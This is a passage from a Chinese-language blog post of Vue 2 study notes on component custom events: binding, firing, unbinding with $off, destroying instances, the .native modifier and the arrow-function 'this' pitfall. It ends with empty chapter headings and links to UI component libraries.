&#125;,<br>  mounted() &#123;<br>    &#x2F;&#x2F; 灵活性强：实现延迟加载自定义事件 &#x2F; Ajax请求发送完回来绑定自定义事件<br>    setTimeout(() &#x3D;&gt; &#123;<br>      this.$refs.school.$on(&quot;miketaylor&quot;, this.getSchoolName);<br>    &#125;, 3000);<br>  &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br><br>&lt;style&gt;<br>.demo &#123;<br>  background-color: #999;<br>  padding: 5px;<br>&#125;<br>&lt;&#x2F;style&gt;<br></code></pre></td></tr></table></figure>

<p><code>Student.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div class&#x3D;&quot;student&quot;&gt;<br>    &lt;h2&gt;姓名:&#123;&#123; name &#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;h2&gt;年龄:&#123;&#123; age &#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;button @click&#x3D;&quot;sendStudentName&quot;&gt;获取学生姓名&lt;&#x2F;button&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>  name: &quot;Student&quot;,<br>  props: [&quot;getStudentName&quot;],<br>  data() &#123;<br>    return &#123;<br>      age: 20,<br>      name: &quot;张加林&quot;,<br>    &#125;;<br>  &#125;,<br>  methods: &#123;<br>    sendStudentName() &#123;<br>      this.getStudentName(this.name);<br>    &#125;,<br>  &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br><br><br>&lt;style&gt;<br>.student &#123;<br>  background-color: #8080ff;<br>  padding: 5px;<br>  margin-top: 30px;<br>&#125;<br>&lt;&#x2F;style&gt;<br></code></pre></td></tr></table></figure>

<p><code>School.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div class&#x3D;&quot;school&quot;&gt;<br>    &lt;h2&gt;学校名称：&#123;&#123; name &#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;h2&gt;学校地址：&#123;&#123; address &#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;button @click&#x3D;&quot;sendStudentName&quot;&gt;点击获取学校名称&lt;&#x2F;button&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>  name: &quot;School&quot;,<br>  data() &#123;<br>    return &#123;<br>      name: &quot;UESTC&quot;,<br>      address: &quot;成华区建设路&quot;,<br>    &#125;;<br>  &#125;,<br>  methods: &#123;<br>    sendStudentName() &#123;<br>      &#x2F;&#x2F; 触发School组件实例对象身上的miketaylor事件<br>      this.$emit(&quot;miketaylor&quot;, this.name);<br>    &#125;,<br>  &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br><br>&lt;style&gt;<br>.school &#123;<br>  background-color: #99ff00;<br>  padding: 5px;<br>&#125;<br>&lt;&#x2F;style&gt;<br></code></pre></td></tr></table></figure>

<p>延迟加载自定义事件，在<code>mounted</code>中使用<code>$on</code>：<img src="C:/Users/LEGION/Pictures/gif/56.gif" srcset="/img/loading.gif" lazyload alt="56" style="zoom:80%;" /></p>
<ul>
<li><p>让自定义事件只能触发一次：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210924172232414.png" srcset="/img/loading.gif" lazyload alt="image-20210924172232414" style="zoom:80%;" />

<p>或者：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210924172315814.png" srcset="/img/loading.gif" lazyload alt="image-20210924172315814" style="zoom:80%;" />
</li>
<li><p>接收多个参数：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210924172715816.png" srcset="/img/loading.gif" lazyload alt="image-20210924172715816" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210924172803367.png" srcset="/img/loading.gif" lazyload alt="image-20210924172803367" style="zoom:80%;" />

<p>但是开发中一般不这样传参，可以先把参数封装成一个对象，还可以使用ES6的<code>...a</code>，下面表示第一个参数正常接收，后面其他的参数存储在数组<code>a</code>中</p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210924173023911.png" srcset="/img/loading.gif" lazyload alt="image-20210924173023911" style="zoom:80%;" /><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210924173132608.png" srcset="/img/loading.gif" lazyload alt="image-20210924173132608" style="zoom:80%;" /></p>
</li>
</ul>
<h4 id="3-11-2-解绑自定义事件"><a href="#3-11-2-解绑自定义事件" class="headerlink" title="3.11.2 解绑自定义事件"></a>3.11.2 解绑自定义事件</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">    &lt;School v-on:miketaylor=<span class="hljs-string">&quot;getSchoolName&quot;</span> @demo=<span class="hljs-string">&quot;test1&quot;</span> /&gt;<br>…………<br>&lt;button @click=<span class="hljs-string">&quot;unbind&quot;</span>&gt;解绑miketaylor事件&lt;/button&gt;<br>…………<br><br><span class="hljs-function"><span class="hljs-title">unbind</span>(<span class="hljs-params"></span>)</span> &#123;<br><span class="hljs-comment">// 解绑一个自定义事件</span><br><span class="hljs-built_in">this</span>.$off(<span class="hljs-string">&quot;miketaylor&quot;</span>);<br><span class="hljs-comment">// 解绑指定的多个自定义事件</span><br><span class="hljs-built_in">this</span>.$off([<span class="hljs-string">&quot;miketaylor&quot;</span>, <span class="hljs-string">&quot;demo&quot;</span>]);<br><span class="hljs-comment">// 解绑所有的自定义事件</span><br><span class="hljs-built_in">this</span>.$off();<br>&#125;,<br></code></pre></td></tr></table></figure>

<p><code>App.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div class&#x3D;&quot;demo&quot;&gt;<br>    &lt;h2&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;h2&gt;<br><br>    &lt;!-- 通过父组件给子组件传递函数类型的props实现：子给父传递数据 --&gt;<br>    &lt;Student :getStudentName&#x3D;&quot;getStudentName&quot; &#x2F;&gt;<br>    &lt;hr &#x2F;&gt;<br><br>    &lt;!-- 通过父组件给子组件绑定一个自定义事件实现：子向父传递数据 （写法一：使用@或v-on）--&gt;<br>    &lt;School v-on:miketaylor&#x3D;&quot;getSchoolName&quot; @demo&#x3D;&quot;test1&quot; &#x2F;&gt;<br><br>    &lt;!-- 通过父组件给子组件绑定一个自定义事件实现：子向父传递数据 （第二种写法，使用ref，灵活性更强）--&gt;<br>    &lt;!-- &lt;School ref&#x3D;&quot;school&quot;&gt;&lt;&#x2F;School&gt; --&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>&#x2F;&#x2F; 引入组件<br>import Student from &quot;.&#x2F;components&#x2F;Student&quot;;<br>import School from &quot;.&#x2F;components&#x2F;School&quot;;<br><br>export default &#123;<br>  name: &quot;App&quot;,<br>  components: &#123; Student, School &#125;,<br>  data() &#123;<br>    return &#123;<br>      msg: &quot;你好鸭&quot;,<br>    &#125;;<br>  &#125;,<br>  methods: &#123;<br>    getStudentName(StudentName) &#123;<br>      console.log(&quot;学生姓名为：&quot;, StudentName);<br>    &#125;,<br>    getSchoolName(SchoolName) &#123;<br>      console.log(&quot;学校名称为：&quot;, SchoolName);<br>    &#125;,<br>    test1() &#123;<br>      console.log(&quot;demo事件被触发了！&quot;);<br>    &#125;,<br>  &#125;,<br>  &#x2F;&#x2F; mounted() &#123;<br>  &#x2F;&#x2F; 灵活性强：实现延迟加载自定义事件 &#x2F; Ajax请求发送完回来绑定自定义事件<br>  &#x2F;&#x2F; setTimeout(() &#x3D;&gt; &#123;<br>  &#x2F;&#x2F;   this.$refs.school.$on(&quot;miketaylor&quot;, this.getSchoolName);<br>  &#x2F;&#x2F; &#125;, 3000);<br>  &#x2F;&#x2F; this.$refs.school.$on(&quot;miketaylor&quot;, this.getSchoolName);<br>  &#x2F;&#x2F; this.$refs.school.$once(&quot;miketaylor&quot;, this.getSchoolName);<br>  &#x2F;&#x2F; &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br><br>&lt;style&gt;<br>.demo &#123;<br>  background-color: #999;<br>  padding: 5px;<br>&#125;<br>&lt;&#x2F;style&gt;<br></code></pre></td></tr></table></figure>

<p><code>School.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div class&#x3D;&quot;school&quot;&gt;<br>    &lt;h2&gt;学校名称：&#123;&#123; name &#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;h2&gt;学校地址：&#123;&#123; address &#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;button @click&#x3D;&quot;sendSchoolName&quot;&gt;点击获取学校名称&lt;&#x2F;button&gt;<br>    &lt;!-- 解绑一个自定义事件 --&gt;<br>    &lt;button @click&#x3D;&quot;unbind&quot;&gt;解绑miketaylor事件&lt;&#x2F;button&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>  name: &quot;School&quot;,<br>  data() &#123;<br>    return &#123;<br>      name: &quot;UESTC&quot;,<br>      address: &quot;成华区建设路&quot;,<br>    &#125;;<br>  &#125;,<br>  methods: &#123;<br>    sendSchoolName() &#123;<br>      &#x2F;&#x2F; 触发School组件实例对象身上的miketaylor事件<br>      this.$emit(&quot;miketaylor&quot;, this.name);<br>      this.$emit(&quot;demo&quot;);<br>    &#125;,<br>    unbind() &#123;<br>      &#x2F;&#x2F; 解绑一个自定义事件<br>      &#x2F;&#x2F; this.$off(&quot;miketaylor&quot;);<br>      &#x2F;&#x2F; 解绑指定的多个自定义事件<br>      &#x2F;&#x2F; this.$off([&quot;miketaylor&quot;, &quot;demo&quot;]);<br>      &#x2F;&#x2F; 解绑所有的自定义事件<br>      this.$off();<br>    &#125;,<br>  &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br><br>&lt;style&gt;<br>.school &#123;<br>  background-color: #99ff00;<br>  padding: 5px;<br>&#125;<br>&lt;&#x2F;style&gt;<br></code></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210924175755345.png" srcset="/img/loading.gif" lazyload alt="image-20210924175755345"></p>
<p><code>main.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 引入Vue</span><br><span class="hljs-keyword">import</span> Vue <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;vue&quot;</span>;<br><span class="hljs-comment">// 引入App</span><br><span class="hljs-keyword">import</span> App <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;./App.vue&quot;</span>;<br><span class="hljs-comment">// 关闭生产提示</span><br>Vue.config.productionTip = <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">// 创建vm</span><br><span class="hljs-keyword">new</span> Vue(&#123;<br>  components: &#123; App &#125;,<br>  render: <span class="hljs-function">(<span class="hljs-params">h</span>) =&gt;</span> h(App),<br>  <span class="hljs-function"><span class="hljs-title">mounted</span>(<span class="hljs-params"></span>)</span> &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-built_in">this</span>.$destroy();<br>    &#125;, <span class="hljs-number">3000</span>);<br>  &#125;,<br>&#125;).$mount(<span class="hljs-string">&quot;#app&quot;</span>);<br></code></pre></td></tr></table></figure>

<p><code>School.vue</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;death&quot;</span>&gt;</span>销毁当前School组件的实例（vc）<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">death</span>(<span class="hljs-params"></span>)</span> &#123;<br>      <span class="hljs-comment">// 销毁了当前School组件实例，销毁后，所有School实例的自定义事件全都不奏效了</span><br>      <span class="hljs-built_in">this</span>.$destroy();<br>    &#125;,<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/57.gif" srcset="/img/loading.gif" lazyload alt="57" style="zoom:80%;" />

<h4 id="3-11-3-总结"><a href="#3-11-3-总结" class="headerlink" title="3.11.3 总结"></a>3.11.3 总结</h4><ul>
<li><p>注意：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>&#123;&#123; msg &#125;&#125;，学校名称是&#123;&#123; schoolName &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">School</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;school&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">School</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">mounted</span>(<span class="hljs-params"></span>)</span> &#123;<br>  <span class="hljs-built_in">this</span>.$refs.school.$on(<span class="hljs-string">&quot;miketaylor&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">SchoolName</span>) </span>&#123;<br>    <span class="hljs-built_in">this</span>.schoolName = SchoolName;<br>  &#125;);<br>&#125;,<br></code></pre></td></tr></table></figure>

<p>这样点击事件是读取不到<code>SchoolName</code>数据的</p>
<p>输出此处的<code>this</code>：<img src="C:/Users/LEGION/AppData/Roaming/Typora/typora-user-images/image-20210924191713551.png" srcset="/img/loading.gif" lazyload alt="image-20210924191713551" style="zoom:80%;" /></p>
<p><code>this</code>是<code>School</code>组件实例对象，因为<code>Vue</code>事件的回调当中的<code>this</code>，是事件的触发者，原来<code>methods</code>中写法没有问题，是因为<code>getSchooName</code>由<code>Vue</code>管理，<code>this</code>指向仍为<code>App</code>组件实例对象。</p>
<ul>
<li><p>解决方法：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210924192932190.png" srcset="/img/loading.gif" lazyload alt="image-20210924192932190" style="zoom:80%;" />

<p>使用箭头函数就没问题了，因为箭头函数没有自己的<code>this</code>，向外找到了<code>mounted</code>函数的<code>this</code>，而该<code>mounted</code>函数由<code>App</code>组件实例对象管理。</p>
</li>
</ul>
</li>
<li><p>在组件标签上使用原生DOM事件</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">School</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;school&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;show&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">School</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span> &#123;<br>      alert(<span class="hljs-string">&quot;你好!&quot;</span>);<br>    &#125;,<br></code></pre></td></tr></table></figure>

<p>默认组件标签上绑定的事件都是自定义事件，在<code>School</code>添加触发语句<code>this.$emit</code>就能生效。</p>
<p>要想让组件标签识别原生DOM事件，加<code>.native</code>修饰符即可：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">School</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;school&quot;</span> @<span class="hljs-attr">click</span>。<span class="hljs-attr">native</span>=<span class="hljs-string">&quot;show&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">School</span>&gt;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>组件自定义事件</p>
<ul>
<li><p>一种组件之间通信的方式，适用于：子组件 =&gt; 父组件</p>
</li>
<li><p>使用场景：A是B组件的父组件，B想给A传递数据，那么就要在A中给B绑定自定义事件（<strong>事件的回调在A中</strong>）</p>
</li>
<li><p>绑定自定义事件：</p>
<ul>
<li><p>方式一：在父组件中：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">School</span> <span class="hljs-attr">v-on:miketaylor</span>=<span class="hljs-string">&quot;getSchoolName&quot;</span> /&gt;</span><br>或<br><span class="hljs-tag">&lt;<span class="hljs-name">School</span> @<span class="hljs-attr">miketaylor</span>=<span class="hljs-string">&quot;getSchoolName&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>方式二：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">School</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;school&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">mounted</span>(<span class="hljs-params"></span>)</span> &#123;<br>   <span class="hljs-built_in">this</span>.$refs.school.$on(<span class="hljs-string">&quot;miketaylor&quot;</span>, <span class="hljs-function">(<span class="hljs-params">SchoolName</span>) =&gt;</span> &#123;<br>     <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>);<br>     <span class="hljs-built_in">this</span>.schoolName = SchoolName;<br>   &#125;);<br> &#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p>若想让自定义事件只触发一次，可以使用<code>once</code>修饰符或<code>$once</code>方法</p>
</li>
</ul>
</li>
<li><p>触发自定义事件：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">this</span>.$emit(<span class="hljs-string">&#x27;miketaylor&#x27;</span>,数据)<br></code></pre></td></tr></table></figure>
</li>
<li><p>解绑自定义事件</p>
<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">this</span>.$<span class="hljs-literal">off</span>()<br></code></pre></td></tr></table></figure>
</li>
<li><p>组件上也可以绑定原生DOM事件，需要使用<code>native</code>修饰符</p>
</li>
<li><p>注意：通过<code>this.$refs.xxx.$on(&#39;miketaylor&#39;,回调)</code>绑定自定义事件时，回调要么配置在<code>methods</code>中，要么使用箭头函数，否则<code>this</code>指向会出问题！</p>
</li>
</ul>
</li>
</ul>
<h4 id="3-11-4-修改TodoList案例-略"><a href="#3-11-4-修改TodoList案例-略" class="headerlink" title="3.11.4 修改TodoList案例(略)"></a>3.11.4 修改TodoList案例(略)</h4><p>原本的案例中回调都已经写好了，将<code>v-bind</code>改为<code>@ / v-on:</code>绑定自定义事件即可，在子组件中，删除<code>props</code>接收对应的内容，添加<code>this.$emit(&quot;事件名&quot;,[数据])</code>即可。</p>
<h4 id="3-12-全局事件总线"><a href="#3-12-全局事件总线" class="headerlink" title="3.12 全局事件总线"></a>3.12 全局事件总线</h4><h3 id="3-13-消息订阅与发布"><a href="#3-13-消息订阅与发布" class="headerlink" title="3.13 消息订阅与发布"></a>3.13 消息订阅与发布</h3><h3 id="3-14-过渡与动画"><a href="#3-14-过渡与动画" class="headerlink" title="3.14 过渡与动画"></a>3.14 过渡与动画</h3><h3 id="3-14-nextTick"><a href="#3-14-nextTick" class="headerlink" title="3.14 $nextTick"></a>3.14 $nextTick</h3><p>3.15 </p>
<h2 id="第四章-Vue中的Ajax"><a href="#第四章-Vue中的Ajax" class="headerlink" title="第四章 Vue中的Ajax"></a>第四章 Vue中的Ajax</h2><h2 id="第五章-Vuex"><a href="#第五章-Vuex" class="headerlink" title="第五章  Vuex"></a>第五章  Vuex</h2><h2 id="第六章-Vue-Router"><a href="#第六章-Vue-Router" class="headerlink" title="第六章 Vue-Router"></a>第六章 Vue-Router</h2><h2 id="第七章-Vue-UI组件库"><a href="#第七章-Vue-UI组件库" class="headerlink" title="第七章 Vue UI组件库"></a>第七章 Vue UI组件库</h2><h3 id="7-1-移动端常用-UI-组件库"><a href="#7-1-移动端常用-UI-组件库" class="headerlink" title="7.1 移动端常用 UI 组件库"></a>7.1 移动端常用 UI 组件库</h3><ol>
<li>Vant <a href="https://youzan.github.io/vant">https://youzan.github.io/vant</a> </li>
<li>Cube UI <a href="https://didi.github.io/cube-ui">https://didi.github.io/cube-ui</a> </li>
<li>Mint UI <a href="http://mint-ui.github.io/">http://mint-ui.github.io</a></li>
</ol>
<h3 id="7-2-PC-端常用-UI-组件库"><a href="#7-2-PC-端常用-UI-组件库" class="headerlink" title="7.2 PC 端常用 UI 组件库"></a>7.2 PC 端常用 UI 组件库</h3><ol>
<li>Element UI <a href="https://element.eleme.cn/">https://element.eleme.cn</a> </li>
<li>IView UI <a href="https://www.iviewui.co/">https://www.iviewui.co</a></li>
</ol>
<h2 id="第八章-Vue-3-0"><a href="#第八章-Vue-3-0" class="headerlink" title="第八章 Vue 3.0"></a>第八章 Vue 3.0</h2><h3 id="8-1-简介"><a href="#8-1-简介" class="headerlink" title="8.1 简介"></a>8.1 简介</h3><h3 id="8-2-创建工程"><a href="#8-2-创建工程" class="headerlink" title="8.2  创建工程"></a>8.2  创建工程</h3><h3 id="8-3-分析工程结构"><a href="#8-3-分析工程结构" class="headerlink" title="8.3 分析工程结构"></a>8.3 分析工程结构</h3>
            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/Vue/">Vue</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    灯火阑珊
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/09/08/%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">视频监控解决方案</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/07/26/Spring5/">
                        <span class="hidden-mobile">Spring5</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      var light = 'github-light';
      var dark = 'github-dark-orange';
      var schema = document.documentElement.getAttribute('data-user-color-scheme');
      if (schema === 'dark') {
        schema = dark;
      } else {
        schema = light;
      }
      window.UtterancesThemeLight = light;
      window.UtterancesThemeDark = dark;
      var s = document.createElement('script');
      s.setAttribute('src', 'https://utteranc.es/client.js');
      s.setAttribute('repo', 'zhangjialin996/comments');
      s.setAttribute('issue-term', 'pathname');
      
      s.setAttribute('label', 'utterances');
      
      s.setAttribute('theme', schema);
      s.setAttribute('crossorigin', 'anonymous');
      document.getElementById('comments').appendChild(s);
    })
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
